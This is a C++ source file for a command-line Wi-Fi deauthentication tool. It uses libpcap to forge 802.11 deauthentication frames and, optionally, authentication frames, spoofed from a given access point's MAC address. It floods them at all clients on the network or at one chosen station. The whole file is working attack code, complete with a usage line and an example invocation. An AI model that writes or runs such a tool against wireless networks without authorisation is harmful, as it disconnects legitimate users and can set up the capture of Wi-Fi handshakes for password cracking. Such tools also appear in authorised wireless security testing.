#include <stdio.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <pcap.h>
#include <memory>
#include <string>
#include <chrono>
#include <thread>
#include "deauthdr.h"
#include "mac.h"

using namespace std;

void usage()
{
    printf("syntax: deauth <interface> <ap mac> [<station mac> -auth]\n");
    printf("sample: deauth mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void sendDeauthPacket(pcap_t *handle, const Mac &smac, const Mac &dmac, const Mac &bssid)
{
    std::unique_ptr<dot11> radio_hdr(new dot11);
    std::unique_ptr<deauthframe> deauth_hdr(new deauthframe);
    std::unique_ptr<deauthbody> deauth_body(new deauthbody);

    deauth_hdr->subtype = 0x00c0;
    deauth_hdr->dur = 0;
    memcpy(deauth_hdr->smac, static_cast<uint8_t *>(smac), Mac::SIZE);
    memcpy(deauth_hdr->dmac, static_cast<uint8_t *>(dmac), Mac::SIZE);
    memcpy(deauth_hdr->bssid, static_cast<uint8_t *>(bssid), Mac::SIZE);
    deauth_hdr->flagseq = 0;

    deauth_body->fixedparam = 0x0007;

    deauthpkt deauth_pkt;
    deauth_pkt.radio_hdr = *radio_hdr;
    deauth_pkt.deauth_hdr = *deauth_hdr;
    deauth_pkt.deauth_body = *deauth_body;
    for (int i = 0; i < 100; ++i)
    {
        if (pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&deauth_pkt), sizeof(deauth_pkt)) != 0)
        {
            fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

void sendAuthPacket(pcap_t *handle, const Mac &smac, const Mac &dmac, const Mac &bssid)
{
    std::unique_ptr<dot11> radio_hdr(new dot11);
    std::unique_ptr<deauthframe> deauth_hdr(new deauthframe);
    std::unique_ptr<authbody> auth_body(new authbody);

    deauth_hdr->subtype = 0x00b0;
    deauth_hdr->dur = 0;
    memcpy(deauth_hdr->smac, static_cast<uint8_t *>(smac), Mac::SIZE);
    memcpy(deauth_hdr->dmac, static_cast<uint8_t *>(dmac), Mac::SIZE);
    memcpy(deauth_hdr->bssid, static_cast<uint8_t *>(bssid), Mac::SIZE);
    deauth_hdr->flagseq = 0;

    unsigned char temp[] = {0x00, 0x00, 0x02, 0x00, 0x00, 0x00};
    memcpy(auth_body->fixedparam, temp, sizeof(temp));

    authpkt auth_pkt;
    auth_pkt.radio_hdr = *radio_hdr;
    auth_pkt.deauth_hdr = *deauth_hdr;
    auth_pkt.auth_body = *auth_body;
    for (int i = 0; i < 100; ++i)
    {
        if (pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&auth_pkt), sizeof(auth_pkt)) != 0)
        {
            fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

int main(int argc, char *argv[])
{
    if (argc < 3)
    {
        usage();
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    char *dev = argv[1];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    Mac apmac(argv[2]);

    switch (argc)
    {
    case 3:
    {
        std::thread t1(sendDeauthPacket, handle, apmac, Mac::broadcastMac(), apmac);
        t1.join();
        break;
    }
    case 4:
    {
        std::thread t1(sendDeauthPacket, handle, apmac, Mac(argv[3]), apmac);
        std::thread t2(sendDeauthPacket, handle, Mac(argv[3]), apmac, apmac);
        t1.join();
        t2.join();
        break;
    }
    case 5:
    {
        std::thread t1(sendAuthPacket, handle, apmac, Mac(argv[3]), apmac);
        t1.join();
        break;
    }
    default:
        usage();
        return -1;
    }

    return 0;
}
